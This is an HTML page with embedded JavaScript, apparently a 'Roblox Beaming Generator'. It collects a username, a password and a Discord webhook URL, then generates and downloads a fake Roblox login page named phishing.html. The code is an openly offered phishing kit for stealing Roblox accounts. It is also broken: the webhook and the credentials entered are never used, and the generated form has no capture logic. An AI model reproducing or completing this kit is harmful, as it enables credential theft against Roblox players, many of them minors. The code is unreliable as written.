<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Roblox Beaming Generator</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <h1>Roblox Beaming Generator</h1>
    <form id="generatorForm">
      <div class="form-group">
        <label for="username">Username:</label>
        <input type="text" id="username" placeholder="Enter username" required />
      </div>
      <div class="form-group">
        <label for="password">Password:</label>
        <input type="password" id="password" placeholder="Enter password" required />
      </div>
      <div class="form-group">
        <label for="webhook">Discord Webhook URL:</label>
        <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/..." required />
      </div>
      <button type="submit">Generate Beaming Page</button>
    </form>
  </div>

  <script>
    document.getElementById("generatorForm").addEventListener("submit", function (e) {
      e.preventDefault();
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const webhook = document.getElementById("webhook").value;

      const phishingPage = `
        <html>
          <head>
            <title>Roblox Login</title>
            <style>
              body { font-family: sans-serif; background: #1e1e1e; color: #fff; padding: 2rem; }
              .login-box { background: #2a2a2a; padding: 2rem; border-radius: 15px; box-shadow: 0 0 10px #000; }
              input { width: 100%; padding: 1rem; margin: 0.5rem 0; border: none; border-radius: 10px; }
              button { padding: 1rem; background: #00ffcc; border: none; border-radius: 10px; cursor: pointer; }
              button:hover { background: #00e6b6; }
            </style>
          </head>
          <body>
            <div class="login-box">
              <h2>Roblox Login</h2>
              <form id="loginForm">
                <input type="text" placeholder="Username" required />
                <input type="password" placeholder="Password" required />
                <button type="submit">Login</button>
              </form>
            </div>
          </body>
        </html>
      `;

      const blob = new Blob([phishingPage], { type: "text/html" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "phishing.html";
      a.click();
    });
  </script>
</body>
</html>
